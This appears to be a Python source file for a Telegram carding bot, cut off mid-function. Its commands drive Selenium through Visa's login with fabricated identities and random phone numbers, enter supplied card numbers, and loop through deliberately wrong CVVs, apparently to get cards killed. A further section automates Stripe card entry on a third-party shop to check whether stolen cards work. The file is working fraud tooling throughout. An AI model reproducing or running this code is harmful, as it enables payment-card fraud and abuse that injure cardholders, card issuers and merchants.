async def kill_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in banned_users:
        await update.message.reply_text("🚫 You are banned from using this bot.", reply_to_message_id=update.message.message_id)
        return
    if not is_approved(uid, "kill"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("kill"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = update.message.reply_to_message.text.strip()

    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ Card input not found.\nUse: `/kill 1234123412341234|12|2026|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    # Prefetch BIN in background (warms cache for the Selenium child process)
    try:
        cc0 = extract_card_input(card_input) or card_input
        b6 = re.sub(r"[^0-9]", "", cc0)[:6]
        if b6:
            asyncio.create_task(_prefetch_bin_async(b6))
    except Exception:
        pass

    msg = await update.message.reply_text("⏳ Killing automation...", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id,
        "text": card_input
    }
    Process(target=run_selenium_process, args=(card_input, update_dict), daemon=True).start()

# ==== 7.4 /kd Command (FINAL - MAX STABLE VERSION) ==== #
def run_kd_process(card_input, update_dict):
    """KD Mode - FINAL (MAX STABILITY)"""
    import random, traceback, time
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys

    start = time.time()
    driver = None

    def safe_click(el):
        try:
            driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
            driver.execute_script("arguments[0].click();", el)
        except:
            pass

    try:
        killer_edit_message(update_dict, "⚙️ Processing (stable mode)...")

        driver = create_killer_driver()
        wait = WebDriverWait(driver, 4)  # 🔥 more stable

        driver.get("https://src.visa.com/login")

        # ================================
        # COOKIE (STABLE)
        # ================================
        try:
            time.sleep(1.2)
            cookie_btn = WebDriverWait(driver, 6).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "a.wscrOk"))
            )
            safe_click(cookie_btn)
        except:
            pass

        # ================================
        # STEP 1 — LOGIN
        # ================================
        identity = killer_get_fake_identity()

        email = wait.until(EC.visibility_of_element_located((By.ID, "email-input")))
        email.clear()
        email.send_keys(identity["email"])

        # Continue
        safe_click(wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//button[.//div[normalize-space()='Continue']]")
        )))

        # wait next field
        phone = wait.until(EC.visibility_of_element_located((By.ID, "login-phone-input-number")))
        driver.execute_script("arguments[0].value='';", phone)

        # valid US phone
        phone.send_keys(
            random.choice(["201","202","203","205","206","207","208","209"]) +
            random.choice(["201","202","303","404","505","606"]) +
            "".join(random.choices("0123456789", k=4))
        )

        # checkbox
        checkbox = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@type='checkbox']")))
        safe_click(checkbox)

        # Next
        safe_click(wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//button[.//div[normalize-space()='Next']]")
        )))

        # ================================
        # STEP 2 — CARD
        # ================================
        wait.until(EC.visibility_of_element_located((By.ID, "card-input")))

        cc, mm, yy, real_cvv = killer_split_card(card_input)
        bin_info, bin_flag = get_cached_bin_info(cc[:6])
        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"

        wrong_cvv = killer_get_wrong_cvv(real_cvv)

        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])

        card_box = wait.until(EC.visibility_of_element_located((By.ID, "card-input")))
        card_box.clear()
        card_box.send_keys(cc)

        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)

        cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
        cvv_field.send_keys(wrong_cvv)

        # ================================
        # STEP 3 — ADDRESS
        # ================================
        wait.until(EC.visibility_of_element_located((By.ID, "line1-input")))

        try:
            country = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
            if "United States" not in (country.get_attribute("value") or ""):
                country.click()
                country.clear()
                country.send_keys("United States")
                country.send_keys(Keys.ENTER)
        except:
            pass

        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(identity["address"])
        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(identity["city"])
        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])

        # Add card
        add_btn = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//div[normalize-space()='Add card']")
        ))
        safe_click(add_btn)

        killer_edit_message(update_dict, "🔄 Processing CVV...")

        # ================================
        # STEP 4 — CVV LOOP (STABLE)
        # ================================
        used = {wrong_cvv}

        for _ in range(5):
            fake = killer_get_wrong_cvv(real_cvv)
            while fake in used:
                fake = killer_get_wrong_cvv(real_cvv)
            used.add(fake)

            try:
                cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
                cvv_field.click()
                cvv_field.send_keys(Keys.CONTROL + "a")
                cvv_field.send_keys(fake)

                safe_click(add_btn)
                time.sleep(0.4)

            except:
                pass

        duration = round(time.time() - start, 2)

        killer_edit_message(update_dict,
            f"💳 **Card:** `{short_card}`\n"
            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
            f"1 Procceed\n"
            f"2 Processed\n\n"
            f"✅ **Status:** KD Stable Success\n"
            f"⏱ **Time:** {duration}s"
        )

        record_cmd_success("kd")

    except Exception as e:
        trace = traceback.format_exc()

        killer_edit_message(update_dict, "❌ Request timeout, try again.")
        killer_admin_report("kd", trace, driver)

        record_cmd_failure("kd")

    finally:
        killer_cleanup_driver(driver)

async def kd_cmd(update, context):
    uid = update.effective_user.id
    if not is_approved(uid, "kd"):
        await update.message.reply_text("⛔ You are not approved to use /kd", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("kd"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args) if context.args else ""
    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ Invalid card.\nUse: `/kd 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    # Prefetch BIN in background (warms cache for the Selenium child process)
    try:
        b6 = re.sub(r"[^0-9]", "", card_input)[:6]
        if b6:
            asyncio.create_task(_prefetch_bin_async(b6))
    except Exception:
        pass

    msg = await update.message.reply_text(f"💳 `{card_input}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id
    }
    Process(target=run_kd_process, args=(card_input, update_dict), daemon=True).start()

# ==== 7.5 /ko Command (FINAL - FAST + STABLE VERSION) ==== #
def run_ko_process(card_input, update_dict):
    """KO Mode - FINAL (FAST + STABLE)"""
    import random, traceback, time
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys

    start = time.time()
    driver = None

    def fast_click(el):
        try:
            driver.execute_script("arguments[0].click();", el)
        except:
            pass

    try:
        killer_edit_message(update_dict, "⚡ Processing (fast mode)...")

        driver = create_killer_driver()
        wait = WebDriverWait(driver, 3)  # ⚡ faster than kd but safe

        driver.get("https://src.visa.com/login")

        # ================================
        # COOKIE
        # ================================
        try:
            time.sleep(0.8)
            btn = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "a.wscrOk"))
            )
            fast_click(btn)
        except:
            pass

        # ================================
        # STEP 1 — LOGIN
        # ================================
        identity = killer_get_fake_identity()

        email = wait.until(EC.visibility_of_element_located((By.ID, "email-input")))
        email.clear()
        email.send_keys(identity["email"])

        # Continue
        fast_click(wait.until(EC.presence_of_element_located(
            (By.XPATH, "//button[.//div[normalize-space()='Continue']]")
        )))

        # wait phone
        phone = wait.until(EC.visibility_of_element_located((By.ID, "login-phone-input-number")))
        driver.execute_script("arguments[0].value='';", phone)

        # valid US phone
        phone.send_keys(
            random.choice(["201","202","203","205","206","207","208","209"]) +
            random.choice(["201","202","303","404","505","606"]) +
            "".join(random.choices("0123456789", k=4))
        )

        # checkbox
        fast_click(wait.until(EC.presence_of_element_located(
            (By.XPATH, "//input[@type='checkbox']")
        )))

        # Next
        fast_click(wait.until(EC.presence_of_element_located(
            (By.XPATH, "//button[.//div[normalize-space()='Next']]")
        )))

        # ================================
        # STEP 2 — CARD
        # ================================
        wait.until(EC.visibility_of_element_located((By.ID, "card-input")))

        cc, mm, yy, real_cvv = killer_split_card(card_input)
        bin_info, bin_flag = get_cached_bin_info(cc[:6])
        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"

        wrong_cvv = killer_get_wrong_cvv(real_cvv)

        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])

        card_box = wait.until(EC.presence_of_element_located((By.ID, "card-input")))
        driver.execute_script("arguments[0].value='';", card_box)
        card_box.send_keys(cc)

        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)

        cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
        cvv_field.send_keys(wrong_cvv)

        # ================================
        # STEP 3 — ADDRESS
        # ================================
        try:
            country = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
            if "United States" not in (country.get_attribute("value") or ""):
                country.click()
                country.clear()
                country.send_keys("United States")
                country.send_keys(Keys.ENTER)
        except:
            pass

        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(identity["address"])
        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(identity["city"])
        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])

        # Add card
        add_btn = wait.until(EC.presence_of_element_located(
            (By.XPATH, "//div[normalize-space()='Add card']")
        ))
        fast_click(add_btn)

        killer_edit_message(update_dict, "🔄 Processing CVV...")

        # ================================
        # STEP 4 — CVV LOOP (FAST + STABLE)
        # ================================
        used = {wrong_cvv}

        for _ in range(5):
            fake = killer_get_wrong_cvv(real_cvv)
            while fake in used:
                fake = killer_get_wrong_cvv(real_cvv)
            used.add(fake)

            try:
                cvv_field.click()
                cvv_field.send_keys(Keys.CONTROL + "a")
                cvv_field.send_keys(fake)

                fast_click(add_btn)
                time.sleep(0.3)  # ⚡ balanced

            except:
                pass

        duration = round(time.time() - start, 2)

        killer_edit_message(update_dict,
            f"💳 **Card:** `{short_card}`\n"
            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
            f"1 Procceed\n"
            f"2 Processed\n\n"
            f"⚡ **Status:** KO Fast Success\n"
            f"⏱ **Time:** {duration}s"
        )

        record_cmd_success("ko")

    except Exception as e:
        trace = traceback.format_exc()

        killer_edit_message(update_dict, "❌ Request timeout, try again.")
        killer_admin_report("ko", trace, driver)

        record_cmd_failure("ko")

    finally:
        killer_cleanup_driver(driver)

async def ko_cmd(update, context):
    uid = update.effective_user.id
    if not is_approved(uid, "ko"):
        await update.message.reply_text("⛔ You are not approved to use /ko", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("ko"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args) if context.args else ""
    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ Invalid card.\nUse: `/ko 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    # Prefetch BIN in background (warms cache for the Selenium child process)
    try:
        b6 = re.sub(r"[^0-9]", "", card_input)[:6]
        if b6:
            asyncio.create_task(_prefetch_bin_async(b6))
    except Exception:
        pass

    msg = await update.message.reply_text(f"💳 `{card_input}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id
    }
    Process(target=run_ko_process, args=(card_input, update_dict), daemon=True).start()

# ==== 7.5 /zz Command (REWRITTEN - DD CORE + FAST OPTIMIZED) ==== #
def run_zz_process(card_input, update_dict):
    """ZZ Mode - FINAL (DD CORE + FASTER + STABLE)"""
    import random, traceback, time
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys

    start = time.time()
    driver = None

    def fast_click(el):
        try:
            driver.execute_script("arguments[0].click();", el)
        except:
            pass

    try:
        killer_edit_message(update_dict, "⚙️ Processing your request...")

        driver = create_killer_driver()
        wait = WebDriverWait(driver, 2)  # ⚡ dd speed

        driver.get("https://src.visa.com/login")

        # ================================
        # COOKIE (FAST)
        # ================================
        try:
            time.sleep(0.6)
            btn = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "a.wscrOk"))
            )
            fast_click(btn)
        except:
            pass

        # ================================
        # STEP 1 — LOGIN
        # ================================
        identity = killer_get_fake_identity()

        email = wait.until(EC.presence_of_element_located((By.ID, "email-input")))
        email.send_keys(identity["email"])

        fast_click(wait.until(EC.presence_of_element_located(
            (By.XPATH, "//button[.//div[normalize-space()='Continue']]")
        )))

        # quick verify next step
        phone = wait.until(EC.presence_of_element_located((By.ID, "login-phone-input-number")))
        driver.execute_script("arguments[0].value='';", phone)

        phone.send_keys(
            random.choice(["201","202","203","205","206","207"]) +
            random.choice(["201","202","303","404"]) +
            "".join(random.choices("0123456789", k=4))
        )

        fast_click(wait.until(EC.presence_of_element_located(
            (By.XPATH, "//input[@type='checkbox']")
        )))

        fast_click(wait.until(EC.presence_of_element_located(
            (By.XPATH, "//button[.//div[normalize-space()='Next']]")
        )))

        # ================================
        # STEP 2 — CARD
        # ================================
        wait.until(EC.presence_of_element_located((By.ID, "card-input")))

        cc, mm, yy, real_cvv = killer_split_card(card_input)
        bin_info, bin_flag = get_cached_bin_info(cc[:6])
        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"

        wrong_cvv = killer_get_wrong_cvv(real_cvv)

        wait.until(EC.presence_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
        wait.until(EC.presence_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])

        card_box = wait.until(EC.presence_of_element_located((By.ID, "card-input")))
        driver.execute_script("arguments[0].value='';", card_box)
        card_box.send_keys(cc)

        wait.until(EC.presence_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)

        cvv_field = wait.until(EC.presence_of_element_located((By.ID, "cvv-input")))
        cvv_field.send_keys(wrong_cvv)

        # ================================
        # STEP 3 — ADDRESS
        # ================================
        wait.until(EC.presence_of_element_located((By.ID, "line1-input")))

        try:
            country = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
            if "United States" not in (country.get_attribute("value") or ""):
                country.click()
                country.clear()
                country.send_keys("United States")
                country.send_keys(Keys.ENTER)
        except:
            pass

        wait.until(EC.presence_of_element_located((By.ID, "line1-input"))).send_keys(identity["address"])
        wait.until(EC.presence_of_element_located((By.ID, "city-input"))).send_keys(identity["city"])
        wait.until(EC.presence_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
        wait.until(EC.presence_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])

        # Add card
        add_btn = wait.until(EC.presence_of_element_located(
            (By.XPATH, "//div[normalize-space()='Add card']")
        ))
        fast_click(add_btn)

        # ================================
        # STEP 4 — CVV LOOP (ULTRA FAST)
        # ================================
        used_cvvs = {wrong_cvv}

        for _ in range(5):
            fake_cvv = killer_get_wrong_cvv(real_cvv)
            while fake_cvv in used_cvvs:
                fake_cvv = killer_get_wrong_cvv(real_cvv)
            used_cvvs.add(fake_cvv)

            try:
                cvv_field.click()
                cvv_field.send_keys(Keys.CONTROL + "a")
                cvv_field.send_keys(fake_cvv)

                fast_click(add_btn)

                time.sleep(0.15)  # ⚡ faster than dd

            except:
                pass

        duration = round(time.time() - start, 2)

        killer_edit_message(update_dict,
            f"💳 **Card:** `{short_card}`\n"
            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
            f"1 Procceed\n"
            f"2 Processed\n\n"
            f"🚀 **Status:** ZZ Optimized Success\n"
            f"⏱ **Time:** {duration}s"
        )

        record_cmd_success("zz")

    except Exception as e:
        trace = traceback.format_exc()

        killer_edit_message(update_dict, "❌ Request timeout, try again.")
        killer_admin_report("zz", trace, driver)

        record_cmd_failure("zz")

    finally:
        killer_cleanup_driver(driver)


async def zz_cmd(update, context):
    uid = update.effective_user.id
    if not is_approved(uid, "zz"):
        await update.message.reply_text("⛔ You are not approved to use /zz", reply_to_message_id=update.message.message_id)
        return

    if not is_cmd_enabled("zz"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args) if context.args else ""
    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ Invalid card.\nUse: `/zz 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    # Prefetch BIN in background (warms cache for the Selenium child process)
    try:
        b6 = re.sub(r"[^0-9]", "", card_input)[:6]
        if b6:
            asyncio.create_task(_prefetch_bin_async(b6))
    except Exception:
        pass

    msg = await update.message.reply_text("⚙️ Processing your request...", reply_to_message_id=update.message.message_id)
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id
    }
    Process(target=run_zz_process, args=(card_input, update_dict), daemon=True).start()

# ==== 7.6 /dd Command (FINAL - FAST + FIXED FLOW) ==== #
def run_dd_process(card_input, update_dict):
    """Killed v6 Ultra-Fast - FINAL FIXED VERSION"""
    import random, traceback, time
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys

    start = time.time()
    driver = None

    def fast_click(el):
        try:
            driver.execute_script("arguments[0].click();", el)
        except:
            pass

    try:
        killer_edit_message(update_dict, "⚡ Processing (ultra-fast)...")

        driver = create_killer_driver()
        wait = WebDriverWait(driver, 2)

        driver.get("https://src.visa.com/login")

        # ================================
        # COOKIE
        # ================================
        try:
            time.sleep(0.8)
            btn = WebDriverWait(driver, 4).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "a.wscrOk"))
            )
            fast_click(btn)
        except:
            pass

        # ================================
        # STEP 1 — LOGIN (UPDATED FLOW)
        # ================================
        identity = killer_get_fake_identity()

        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(identity["email"])

        fast_click(wait.until(EC.presence_of_element_located(
            (By.XPATH, "//button[.//div[normalize-space()='Continue']]")
        )))

        phone = wait.until(EC.presence_of_element_located((By.ID, "login-phone-input-number")))
        driver.execute_script("arguments[0].value='';", phone)

        # ✅ valid US phone
        phone.send_keys(
            random.choice(["201","202","203","205","206","207"]) +
            random.choice(["201","202","303","404"]) +
            "".join(random.choices("0123456789", k=4))
        )

        fast_click(wait.until(EC.presence_of_element_located(
            (By.XPATH, "//input[@type='checkbox']")
        )))

        fast_click(wait.until(EC.presence_of_element_located(
            (By.XPATH, "//button[.//div[normalize-space()='Next']]")
        )))

        # ================================
        # STEP 2 — CARD
        # ================================
        cc, mm, yy, real_cvv = killer_split_card(card_input)
        bin_info, bin_flag = get_cached_bin_info(cc[:6])
        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"

        wrong_cvv = killer_get_wrong_cvv(real_cvv)

        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(identity["first_name"])
        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(identity["last_name"])

        card_box = wait.until(EC.presence_of_element_located((By.ID, "card-input")))
        driver.execute_script("arguments[0].value='';", card_box)
        card_box.send_keys(cc)

        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)

        cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
        cvv_field.send_keys(wrong_cvv)

        # ================================
        # STEP 3 — ADDRESS
        # ================================
        try:
            country = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
            if "United States" not in (country.get_attribute("value") or ""):
                country.click()
                country.clear()
                country.send_keys("United States")
                country.send_keys(Keys.ENTER)
        except:
            pass

        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(identity["address"])
        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(identity["city"])
        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])

        # 🔥 NEW ADD CARD BUTTON
        add_btn = wait.until(EC.presence_of_element_located(
            (By.XPATH, "//div[normalize-space()='Add card']")
        ))
        fast_click(add_btn)

        killer_edit_message(update_dict, "⚡ Updating (ultra-fast)...")

        # ================================
        # STEP 4 — CVV LOOP (DD STYLE FAST)
        # ================================
        used = {wrong_cvv}

        for _ in range(5):  # total 6 tries
            fake = killer_get_wrong_cvv(real_cvv)
            while fake in used:
                fake = killer_get_wrong_cvv(real_cvv)
            used.add(fake)

            try:
                cvv_field.click()
                cvv_field.send_keys(Keys.CONTROL + "a")
                cvv_field.send_keys(fake)

                fast_click(add_btn)
                time.sleep(0.2)

            except:
                pass

        duration = round(time.time() - start, 2)

        # ================================
        # ✅ ORIGINAL DD RESULT STYLE
        # ================================
        killer_edit_message(update_dict,
            f"💳 **Card:** `{short_card}`\n"
            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
            f"1 Procceed\n"
            f"2 Processed\n\n"
            f"⚡ **Status:** Killed v6 Ultra-Fast\n"
            f"⏱ **Time:** {duration}s"
        )

        record_cmd_success("dd")

    except Exception as e:
        trace = traceback.format_exc()

        # ✅ CLEAN USER ERROR
        killer_edit_message(update_dict, "❌ Request timeout, try again.")

        # ✅ ADMIN DEBUG
        killer_admin_report("dd", trace, driver)

        record_cmd_failure("dd")

    finally:
        killer_cleanup_driver(driver)


async def dd_cmd(update, context):
    uid = update.effective_user.id
    if not is_approved(uid, "dd"):
        await update.message.reply_text("⛔ You are not approved to use /dd", reply_to_message_id=update.message.message_id)
        return

    if not is_cmd_enabled("dd"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args) if context.args else ""
    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ Invalid card.\nUse: `/dd 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    # Prefetch BIN in background (warms cache for the Selenium child process)
    try:
        b6 = re.sub(r"[^0-9]", "", card_input)[:6]
        if b6:
            asyncio.create_task(_prefetch_bin_async(b6))
    except Exception:
        pass

    msg = await update.message.reply_text("⚡ Processing (ultra-fast)...", reply_to_message_id=update.message.message_id)
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id
    }
    Process(target=run_dd_process, args=(card_input, update_dict), daemon=True).start()

# ==== 8. STRIPE AUTH V1 (/st) — Single Only (batch removed) ==== #
def extract_all_card_inputs(raw_text: str):
    t = (raw_text or "").replace("\r", "\n")
    t = t.replace("/", "|").replace("\\", "|").replace(" ", "|")
    return re.findall(r"\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}", t)

def run_st_process(card_input, update_dict):
    asyncio.run(st_single_main(card_input, update_dict))

def _wait_for_stripe_iframe(driver, timeout=12):
    """Wait until *any* Stripe Elements iframe appears."""
    end = time.time() + timeout
    SEL = ("iframe[name^='__privateStripeFrame'], "
           "iframe[src*='stripe'], "
           "iframe[src*='js.stripe.com'], "
           "iframe[src*='m.stripe.network']")
    while time.time() < end:
        if driver.find_elements(By.CSS_SELECTOR, SEL):
            return True
        time.sleep(0.4)
    return False

def _open_add_payment_form(driver, wait):
    """
    Click the 'Add payment method' button/link if visible.
    Fallback: navigate directly to the add-payment page.
    Returns True when Stripe iframes are present.
    """
    try:
        btn = wait.until(EC.element_to_be_clickable((
            By.XPATH,
            "//a[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'add payment method')]"
            " | //button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'add payment method')]"
        )))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
        driver.execute_script("arguments[0].click();", btn)
    except:
        pass
    if _wait_for_stripe_iframe(driver, 8):
        return True
    driver.get("https://www.shoprootscience.com/my-account/add-payment-method")
    return _wait_for_stripe_iframe(driver, 10)

def _is_too_soon(msg: str) -> bool:
    if not msg: return False
    m = msg.lower()
    return ("cannot add a new payment method so soon" in m) or ("too soon" in m)

# Adaptive Stripe filler
def _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=False):
    import time
    deadline = time.time() + 15
    stripe_iframes = []
    STRIPE_IFRAME_SEL = (
        "iframe[name^='__privateStripeFrame'], "
        "iframe[src*='stripe'], "
        "iframe[src*='js.stripe.com'], "
        "iframe[src*='m.stripe.network']"
    )
    while time.time() < deadline:
        stripe_iframes = driver.find_elements(
            By.CSS_SELECTOR,
            STRIPE_IFRAME_SEL
        )
        if stripe_iframes:
            break
        time.sleep(0.4)
    if not stripe_iframes:
        raise Exception("❌ Stripe fields did not load")

    card_filled = expiry_filled = cvv_filled = False
    number_candidates = [
        ("id", "Field-numberInput"),
        ("css", "input[name='cardnumber'], input[autocomplete='cc-number']"),
        ("css", "input[data-elements-stable-field-name='cardNumber'], input[name='cardNumber']"),
        ("css", "input[aria-label*='card number' i], input[aria-label*='card' i][autocomplete='cc-number']"),
        ("css", "input[placeholder*='1234' i]"),
    ]
    expiry_candidates = [
        ("id", "Field-expiryInput"),
        ("css", "input[name='exp-date'], input[autocomplete='cc-exp']"),
        ("css", "input[data-elements-stable-field-name='cardExpiry'], input[name='cardExpiry']"),
        ("css", "input[aria-label*='expiration' i], input[aria-label*='expiry' i]"),
        ("css", "input[placeholder*='mm / yy' i], input[placeholder*='mm/yy' i]"),
    ]
    cvc_candidates = [
        ("id", "Field-cvcInput"),
        ("css", "input[name='cvc'], input[autocomplete='cc-csc']"),
        ("css", "input[data-elements-stable-field-name='cardCvc'], input[name='cardCvc']"),
        ("css", "input[aria-label*='security code' i], input[aria-label*='cvc' i], input[aria-label*='cvv' i]"),
    ]
    postal_candidates = [
        ("id", "Field-postalCodeInput"),
        ("css", "input[name='postal'], input[name='postalCode'], input[autocomplete='postal-code']"),
        ("css", "input[data-elements-stable-field-name='postalCode'], input[name='billingPostalCode']"),
        ("css", "input[aria-label*='zip' i], input[aria-label*='postal' i]"),
    ]

    def _pick_visible_first(elements):
        for el in elements:
            try:
                if el.is_displayed() and el.is_enabled():
                    return el
            except Exception:
                continue
        return elements[0] if elements else None

    def _fill(cands, value) -> bool:
        els = []
        for kind, sel in cands:
            try:
                els = driver.find_elements(By.ID, sel) if kind == "id" else driver.find_elements(By.CSS_SELECTOR, sel)
            except Exception:
                els = []
            if els:
                break
        if not els:
            return False
        el = _pick_visible_first(els)
        if not el:
            return False
        try:
            el.click()
        except Exception:
            pass
        if clear_first:
            try:
                el.send_keys(Keys.CONTROL, "a")
                el.send_keys(Keys.BACKSPACE)
            except Exception:
                pass
        try:
            el.send_keys(value)
            return True
        except Exception:
            return False

    def _try_fill_current_context() -> None:
        nonlocal card_filled, expiry_filled, cvv_filled
        if not card_filled:
            card_filled = _fill(number_candidates, card) or card_filled
        if not expiry_filled:
            expiry_filled = _fill(expiry_candidates, expiry) or expiry_filled
        if not cvv_filled:
            cvv_filled = _fill(cvc_candidates, cvv) or cvv_filled
        # Some Stripe forms require ZIP/postal code. Best-effort.
        _fill(postal_candidates, _random_us_zip())

    # Try in each top-level Stripe frame; if it looks like a container, also try nested Stripe frames.
    for iframe in stripe_iframes:
        if card_filled and expiry_filled and cvv_filled:
            break
        try:
            driver.switch_to.default_content()
            driver.switch_to.frame(iframe)
        except Exception:
            continue

        _try_fill_current_context()
        if card_filled and expiry_filled and cvv_filled:
            break

        # If this is a Payment Element container, fields may be inside nested frames.
        try:
            nested_frames = driver.find_elements(By.CSS_SELECTOR, STRIPE_IFRAME_SEL)
        except Exception:
            nested_frames = []

        for nf in nested_frames:
            if card_filled and expiry_filled and cvv_filled:
                break
            try:
                driver.switch_to.frame(nf)
                _try_fill_current_context()
            except Exception:
                pass
            finally:
                try:
                    driver.switch_to.parent_frame()
                except Exception:
                    pass

    driver.switch_to.default_content()
    if not (card_filled and expiry_filled and cvv_filled):
        raise Exception("❌ Failed to fill all Stripe fields")

def _random_us_zip() -> str:
    # Use known-valid US ZIPs (avoid placeholders like 12345).
    return random.choice(["10001", "94105", "33101", "60601", "98101", "30301", "77002", "85001", "20001", "02210"])

def _fill_zip_outside_stripe_if_present(driver, zip_code: str) -> None:
